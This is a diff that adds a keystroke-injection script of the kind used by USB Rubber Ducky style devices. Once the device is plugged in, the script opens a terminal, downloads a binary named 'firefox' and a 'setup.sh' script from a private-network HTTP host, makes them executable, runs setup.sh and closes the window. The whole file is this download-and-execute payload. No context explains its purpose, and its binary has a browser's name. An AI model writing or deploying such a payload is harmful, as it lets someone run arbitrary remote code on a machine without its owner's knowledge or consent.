@@ -1,0 +1,47 @@
+DELAY 100
+GUI d
+DELAY 100
+STRING terminal
+DELAY 100
+Enter
+DELAY 100
+
+STRING cd
+DELAY 100
+Enter
+DELAY 100
+
+STRING mkdir -p ToolBox
+DELAY 100
+Enter
+DELAY 100
+STRING cd ToolBox
+DELAY 100
+Enter
+DELAY 100
+
+STRING wget http://10.30.36.236:8000/firefox
+DELAY 100
+Enter
+DELAY 100000
+STRING chmod +x firefox
+DELAY 100
+Enter
+DELAY 100
+
+STRING wget http://10.30.36.236:8000/setup.sh
+DELAY 100
+Enter
+DELAY 1000
+STRING chmod +x setup.sh
+DELAY 100
+Enter
+DELAY 100
+
+STRING ./setup.sh
+DELAY 100
+Enter
+DELAY 100
+STRING exit
+DELAY 100
+Enter
